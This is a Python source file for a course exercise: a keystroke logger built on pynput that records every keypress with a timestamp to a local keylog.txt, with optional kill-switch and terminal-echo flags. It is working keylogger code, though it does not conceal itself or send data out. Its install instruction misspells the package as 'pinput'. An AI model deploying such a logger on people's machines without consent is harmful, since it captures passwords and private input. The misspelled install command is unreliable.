#Developer
"""
Created by Sophia Spaner (VPQ5KD) for Intro to Cybersecurity. This code is not meant to be used for illicit purposes.
"""
#Sources
"""
https://www.youtube.com/watch?v=mDY3v2Xx-Q4&t=16s - used this to get the basic functionality of pynput.keyboard
https://pynput.readthedocs.io/en/latest/keyboard.html - used pynput.keyboard documentation in tandem with the video

"""
#imports
import sys
import datetime
from pynput import keyboard
#Arguments
"""
-WKS (with kill switch):[MUST BE FIRST ARGUMENT] Allows user to designate the ctrl+D keystroke as a kill switch which stops the program.
-PTT (print to terminal):[MAY BE FIRST OR SECOND ARGUMENT] Allows user to print the contents going to to the file to the terminal as well, primarily used for development.
"""
#TO RUN
""" 
make sure you have pynput installed in your system. If it is not installed, run the command "pip install pinput" (sin quotations) in your terminal.
to run type "python keyStrokeLogger.py OPTIONAL_argument1 OPTIONAL_argument2" 

"""
#function that controls what happens each keypress
def keyPress(key):
    printToTerminal(key) #prints the keystroke and timestamp to terminal if selected with -PPT
    writeKeyToFile(key) #writes the keystroke and timestamp to the keylog.txt file
    checkForEndOfProgram(key) #runs the kill switch logic if selected with -WKS

#function tht controls kill switch logic
def checkForEndOfProgram(key):
    endOfProgram = str(key) == r"'\x04'" and len(sys.argv) > 1 and sys.argv[1] == "-WKS" #program ends if WKS is selected and the ctrl+d keystroke occurs
    if endOfProgram:
        sys.exit(0)

#function that writes the keystroke and timestamp to a file
def writeKeyToFile(key):
    time = datetime.datetime.now()
    with open("keylog.txt", 'a') as keyLog:
        #try catch handles when the key can't be turned into a character (i.e. backspace or enter)
        try:
            char = key.char
            keyLog.write(f'{time}: {char}\n')
        except AttributeError:
            keyLog.write(f'{time}: {key}\n')

#function that prints the keystroke and timestamp to terminal if selected with -PTT
def printToTerminal(key):
    printCondition = (len(sys.argv) == 2 and sys.argv[1] == "-PTT") or (len(sys.argv) == 3 and sys.argv[2] == "-PTT")
    if printCondition:
        time = datetime.datetime.now()
        print(f'{time}: {str(key)}')
#function that handles system errors for commandline arguments.
def argumentHandler():
    if len(sys.argv) > 3: #throws an error if there are too many arguments
        raise ValueError("Too many arguments, please retry with no more than 2 valid arguments (-WKS and/or -PTT")

    elif len(sys.argv) == 3: #throws an error if the arguments are invalid or if they are in the wrong order
        if sys.argv[1] != "-WKS":
            raise ValueError(f'{sys.argv[1]} is not a valid argument or is not in the correct spot. If you would like to use two arguments make sure argument 1 is -WKS and argument 2 is -PTT')
        elif sys.argv[2] != "-PTT":
            raise ValueError(f'{sys.argv[2]} is not a valid argument or is not in the correct spot. If you would like to use two arguments make sure argument 1 is -WKS and argument 2 is -PTT')

    elif len(sys.argv) == 2: #throws an error if there is only one argument and it is invalid
        if sys.argv[1] != "-WKS" and sys.argv[1] != "-PTT":
            raise ValueError(f'{sys.argv[1]} is not a valid argument, valid options are -WKS or -PTT')

#starts the listener
def listenerStart():
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()

#main function
def main():
    argumentHandler()
    listenerStart()

main()
